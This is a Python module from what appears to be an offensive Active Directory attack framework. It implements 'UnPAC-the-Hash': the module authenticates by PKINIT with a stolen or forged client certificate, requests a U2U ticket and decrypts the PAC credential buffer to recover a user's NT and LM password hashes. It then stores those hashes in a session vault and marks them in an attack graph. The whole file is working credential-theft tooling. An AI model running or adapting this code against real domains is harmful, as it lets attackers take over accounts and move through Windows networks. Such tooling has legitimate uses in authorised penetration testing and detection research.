"""UnPAC-the-Hash — recover NT hashes from a PKINIT TGT's PAC credentials.

After PKINIT with a client certificate, request a U2U self-ticket and decrypt
``PAC_CREDENTIAL_INFO`` with the AS-REP key. Also accepts an NT hash already
surfaced by Certipy auth stdout.
"""

from __future__ import annotations

import json
import logging
import os
from collections.abc import Iterator
from contextlib import contextmanager
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target
from adaf_attack.core.unpac import (
    parse_asrep_key,
    parse_nt_hash_from_text,
    request_u2u_pac,
)

console = Console()
_logger = logging.getLogger(__name__)


@contextmanager
def _temporary_krb5ccname(path: str) -> Iterator[None]:
    previous = os.environ.get("KRB5CCNAME")
    os.environ["KRB5CCNAME"] = path
    try:
        yield
    finally:
        if previous is None:
            os.environ.pop("KRB5CCNAME", None)
        else:
            os.environ["KRB5CCNAME"] = previous


def _pac_buffer_count(pac: Any, buff: Any) -> int:
    """Resolve PAC buffer count across real Impacket objects and test doubles."""
    try:
        raw = pac["cBuffers"]
    except Exception:
        raw = None
    if isinstance(raw, int):
        return raw
    if isinstance(buff, list | tuple):
        return len(buff)
    return 0


def _extract_nt_from_pac(pac_data: bytes, asrep_key: str | None = None) -> dict[str, str] | None:
    """Parse PAC buffers; decrypt when an AS-REP key is supplied."""
    from impacket.krb5.pac import PAC_CREDENTIAL_INFO, PAC_INFO_BUFFER, PACTYPE

    from adaf_attack.core.unpac import decrypt_pac_credential_info

    if asrep_key:
        try:
            return decrypt_pac_credential_info(pac_data, asrep_key)
        except Exception:
            _logger.debug("PAC credential decrypt failed", exc_info=True)
            return {
                "status": "not_recovered",
                "reason": "PAC_CREDENTIAL_INFO decryption failed",
            }

    pac = PACTYPE(pac_data)
    buff = pac["Buffers"]
    for _ in range(_pac_buffer_count(pac, buff)):
        try:
            info = PAC_INFO_BUFFER(buff)
        except Exception:
            _logger.debug("Could not parse PAC credential buffer", exc_info=True)
            break
        try:
            if info["ulType"] == 2:  # PAC_CREDENTIAL_INFO
                PAC_CREDENTIAL_INFO(
                    pac_data[info["Offset"] : info["Offset"] + info["cbBufferSize"]]
                )
                return {
                    "status": "not_recovered",
                    "reason": "PAC_CREDENTIAL_INFO present; pass asrep_key to decrypt",
                }
        except Exception:
            _logger.debug("Could not inspect PAC credential buffer", exc_info=True)
        try:
            buff = buff[len(info) :]
        except Exception:
            break
    return None


@register_capability(
    id="unpac-the-hash",
    summary="Recover NT hash from PAC_CREDENTIAL_INFO after PKINIT (UnPAC-the-Hash)",
    category="credential-access",
    tags=("pkinit", "unpac", "adcs", "cert-to-hash"),
)
class UnpacTheHash:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("unpac-the-hash")
        pfx = kwargs.get("pfx")
        key = kwargs.get("key")
        cert = kwargs.get("cert")
        sam = kwargs.get("sam")
        asrep_key = kwargs.get("asrep_key") or kwargs.get("key_hex")
        if not sam:
            raise RuntimeError("Pass -P sam=<user> (the certificate subject).")
        if not (pfx or (key and cert)):
            raise RuntimeError("Provide -P pfx=<path> or both -P key=<pem> and -P cert=<pem>.")

        console.print(f"[bold]UnPAC-the-Hash[/bold] sam={sam}")

        from adaf_attack.capabilities.pkinit_auth import PkinitAuth

        pkinit_kwargs = {"sam": sam}
        if pfx:
            pkinit_kwargs["pfx"] = pfx
        if key:
            pkinit_kwargs["key"] = key
        if cert:
            pkinit_kwargs["cert"] = cert

        # Nested PKINIT obtains a TGT; force is required by that runner.
        pkinit_result = PkinitAuth().run(
            target,
            session,
            graph,
            include_secrets=include_secrets,
            force=True,
            **pkinit_kwargs,
        )
        ccache = pkinit_result.get("ccache")
        if not ccache:
            raise RuntimeError("PKINIT did not produce a ccache; cannot request PAC.")

        # Prefer AS-REP key from explicit param, then pkinit result / tool stdout.
        if not asrep_key:
            asrep_key = pkinit_result.get("asrep_key") or parse_asrep_key(
                "\n".join(
                    str(pkinit_result.get(k) or "")
                    for k in ("stdout", "stderr", "gettgtpkinit_stdout")
                )
            )

        pac_note: dict[str, Any] | str | None = None

        # Certipy auth often already recovers the NT hash during PKINIT.
        certipy_hash = parse_nt_hash_from_text(
            "\n".join(str(pkinit_result.get(k) or "") for k in ("stdout", "stderr"))
        )
        if certipy_hash:
            pac_note = {
                "status": "recovered",
                "nt_hash": certipy_hash,
                "method": "certipy-auth",
            }
        elif asrep_key:
            u2u = request_u2u_pac(
                ccache_path=str(ccache),
                username=str(sam).split("@")[0],
                domain=target.domain,
                dc_ip=target.dc_ip,
                asrep_key_hex=str(asrep_key),
            )
            if u2u.get("ok"):
                pac_note = {
                    "status": "recovered",
                    "nt_hash": u2u.get("nt_hash"),
                    "lm_hash": u2u.get("lm_hash"),
                    "method": "u2u-pac",
                }
            else:
                pac_note = {
                    "status": "not_recovered",
                    "reason": u2u.get("error") or "U2U UnPAC failed",
                    "asrep_key_present": True,
                }
        else:
            pac_note = {
                "status": "not_recovered",
                "reason": (
                    "AS-REP key unavailable; re-run with -P asrep_key=<hex> from "
                    "gettgtpkinit, or use certipy-ad which prints the NT hash."
                ),
            }

        nt_hash = pac_note.get("nt_hash") if isinstance(pac_note, dict) else None
        if nt_hash and include_secrets:
            try:
                session.vault().put(
                    "unpac-nt-hash",
                    "nt_hash",
                    {"nt_hash": nt_hash, "sam": sam},
                    secret=True,
                    metadata={"sam": sam, "source": "unpac-the-hash"},
                )
            except Exception as exc:
                session.log("vault.store_skipped", reason=str(exc), capability="unpac-the-hash")

        result = {
            "sam": sam,
            "pkinit_ccache": str(ccache),
            "asrep_key_present": bool(asrep_key),
            "pac_credential_info": pac_note,
            "status": "recovered" if nt_hash else "not_recovered",
            "ok": bool(nt_hash),
        }
        if nt_hash and include_secrets:
            result["nt_hash"] = nt_hash
        elif nt_hash:
            result["nt_hash_present"] = True

        if nt_hash:
            node = f"USER@{str(sam).upper()}@{target.domain.upper()}"
            graph.add_node(node, "User", sam=sam, source="unpac")
            graph.add_edge(node, node, "HasNTHash", via="unpac-the-hash")

        out = session.path("unpac.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log("unpac-the-hash.complete", sam=sam, status=result["status"])
        console.print(f"[green]Done[/green]  status={result['status']}")
        return result
